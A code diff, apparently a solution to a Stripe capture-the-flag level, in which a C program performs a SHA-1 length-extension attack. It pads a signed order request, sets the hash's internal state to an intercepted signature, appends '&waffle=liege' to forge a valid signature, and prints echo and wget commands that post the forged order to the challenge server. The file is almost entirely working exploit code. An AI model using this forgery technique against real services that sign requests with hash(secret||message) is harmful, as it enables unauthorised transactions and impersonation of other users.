@@ -1,79 +1,145 @@
 #include <stdio.h>
-#include <openssl/sha.h>
 #include <arpa/inet.h>
 #include <string.h>
 #include <stdlib.h>
 
-int main()
+#include <openssl/sha.h>
+
+/* Create a buffer and URLEncode stuff (yes, this is shitty code :) ) */
+void print_url(unsigned char *url, int url_length, unsigned char *signature)
+{
+  char *buffer = malloc((url_length * 4) + 1);
+  int offset = 0;
+  int i;
+  memcpy(buffer, url, url_length);
+
+  /* Do a shitty urlencode */
+  for(i = 0; i < url_length; i++)
+  {
+    if(url[i] < 0x20 || url[i] > 0x7F)
+    {
+      sprintf(buffer + offset, "\\x%02x", url[i]);
+      offset += 4;
+    }
+    else
+    {
+      sprintf(buffer + offset, "%c", url[i]);
+      offset += 1;
+    }
+  }
+
+  printf("echo -ne \"%s|sig:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\" > payload.bin\n", buffer,
+      signature[0],  signature[1],  signature[2],  signature[3],
+      signature[4],  signature[5],  signature[6],  signature[7],
+      signature[8],  signature[9],  signature[10], signature[11],
+      signature[12], signature[13], signature[14], signature[15],
+      signature[16], signature[17], signature[18], signature[19]
+      );
+
+  printf("wget -qO- --post-file=payload.bin https://level07-2.stripe-ctf.com/user-khqqbglfcj/orders\n");
+}
+
+void print_hex(unsigned char *data, unsigned int length)
+{
+  unsigned int i;
+
+  for(i = 0; i < length; i++)
+    printf("%02x", data[i]);
+  printf("\n");
+}
+
+void add_padding(unsigned char *data, int *new_length)
+{
+  int original_length = (int)strlen((char*)data);
+  *new_length = original_length;
+
+  data[(*new_length)++] = 0x80;
+
+  /* Loop until we only require four bytes */
+  while(((*new_length) + 4) % 64 != 0)
+    data[(*new_length)++] = 0x00;
+
+  /* Bytes -> bits */
+  original_length = original_length * 8;
+
+  data[(*new_length)++] = (original_length >> 24) & 0x000000FF;
+  data[(*new_length)++] = (original_length >> 16) & 0x000000FF;
+  data[(*new_length)++] = (original_length >>  8) & 0x000000FF;
+  data[(*new_length)++] = (original_length >>  0) & 0x000000FF;
+}
+
+void get_signature(char *secret, char *params, unsigned char *signature)
 {
   SHA_CTX c;
-  unsigned char buffer[200];
-  int i;
-  char block1[] = "ivtAUQRQ6dFmH9user_id=5&count=1&lat=90&user_id=5&long=49&waffle=";
-  char block2[] = "liege\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x28";
 
-  char block3[] = "XXXXXXXXXXXXXXuser_id=5&count=1&lat=90&user_id=5&long=49&waffle=";
-  char block4[] = "liege\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x28";
-/*
-user_id=5&count=1&lat=90&user_id=5&long=49&waffle=liege%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%28|sig:a37f1fce8fddfdd0bf76baba3c7cb699d6b19bc5
-
-*/
-
-  printf("Length1 = %d\n", (int)sizeof(block1) - 1);
-  printf("Length2 = %d\n", (int)sizeof(block2) - 1);
-
-  printf("Length3 = %d\n", (int)sizeof(block3) - 1);
-  printf("Length4 = %d\n", (int)sizeof(block4) - 1);
-
+  /* Hash the secret and the params */
   SHA1_Init(&c);
-  SHA1_Update(&c, block1, 64);
-  SHA1_Update(&c, block2, 64);
-  SHA1_Update(&c, "&waffle=liege", 13);
-  SHA1_Final(buffer, &c);
+  SHA1_Update(&c, secret, strlen(secret));
+  SHA1_Update(&c, params, strlen(params));
+  SHA1_Final(signature, &c);
+}
 
-  for(i = 0; i < 20; i++)
-    printf("%02x", buffer[i]);
-  printf("\n"); 
+void test_legit(char *secret, char *params, unsigned char signature[20])
+{
+  /* Get the valid signature */
+  get_signature(secret, params, signature);
 
+  printf("Signature: ");
+  print_hex(signature, 20);
 
+  printf("Valid URL based on signature:\n");
+  print_url((unsigned char*)params, strlen((char*)params), signature);
+}
+
+void test_hack(char *params, char *extra, char *original_hash)
+{
+  SHA_CTX c;
+  char to_sign[2000];
+  char url[2000];
+  int length;
+  char signature[20];
+
+  /* Generate the data to hash */
+  strcpy(to_sign, "XXXXXXXXXXXXXX");
+  strcat(to_sign, params);
+  add_padding(to_sign, &length);
+
+  /* Generate the url for the user */
+  memset(url, 0, sizeof(url));
+  memcpy(url, to_sign + 14, length - 14);
+  memcpy(url + length - 14, extra, strlen(extra));
+
+  /* Start the hash */
   SHA1_Init(&c);
-  SHA1_Update(&c, "XXXXXXXXXXXXXXuser_id=5&count=1&lat=90&user_id=5&long=49&waffle=", 64);
-  SHA1_Update(&c, "liege\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x28", 64);
-  c.h0 = 0x4c21a2ff;
-  c.h1 = 0x8e0ea98f;
-  c.h2 = 0x57e4215f;
-  c.h3 = 0x43aa330a;
-  c.h4 = 0x4873b683;
+  SHA1_Update(&c, to_sign, length);
 
-  SHA1_Update(&c, "&waffle=liege", 13);
-  SHA1_Final(buffer, &c);
+  /* Replace the internal state */
+  c.h0 = htonl(((int*)original_hash)[0]);
+  c.h1 = htonl(((int*)original_hash)[1]);
+  c.h2 = htonl(((int*)original_hash)[2]);
+  c.h3 = htonl(((int*)original_hash)[3]);
+  c.h4 = htonl(((int*)original_hash)[4]);
 
-  for(i = 0; i < 20; i++)
-    printf("%02x", buffer[i]);
-  printf("\n");
+  /* Add the extra stuff to the params */
+  SHA1_Update(&c, extra, strlen(extra));
+  SHA1_Final(signature, &c);
 
-/*  char attack1[] = "XXXXXXXXXXXXXXcount=2&lat=37.351&user_id=1&long=-119.827&waffle=";
-  char attack2[] = "chicken\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x38";
+  print_url(url, length - 14 + strlen(extra), signature);
+}
 
-  printf("Length1 = %d\n", (int)sizeof(attack1) - 1);
-  printf("Length2 = %d\n", (int)sizeof(attack2) - 1);
+int main()
+{
+/*  unsigned char signature[20];
+  char *secret = "ivtAUQRQ6dFmH9";
+  char *params = "count=1&lat=37.351&user_id=5&long=-119.827&waffle=chicken";
 
-  SHA1_Init(&c);
-  SHA1_Update(&c, attack1, 64);
-  SHA1_Update(&c, attack2, 64);
+  test_legit(secret, params, signature);
+  test_hack(params, "&waffle=liege", signature); */
 
-  c.h0 = 0xe8c57bb7;
-  c.h1 = 0xcbb6fa98;
-  c.h2 = 0xd116ed06;
-  c.h3 = 0x622d6000;
-  c.h4 = 0xee431d49;
+  char *params = "count=2&lat=37.351&user_id=1&long=-119.827&waffle=chicken";
+  unsigned char *signature = "\xe8\xc5\x7b\xb7\xcb\xb6\xfa\x98\xd1\x16\xed\x06\x62\x2d\x60\x00\xee\x43\x1d\x49";
 
-  SHA1_Update(&c, "&waffle=liege", 13);
-  SHA1_Final(buffer, &c);
-
-  for(i = 0; i < 20; i++)
-    printf("%02x", buffer[i]);
-  printf("\n"); */
+  test_hack(params, "&waffle=liege", signature);
 
   return 0;
 }
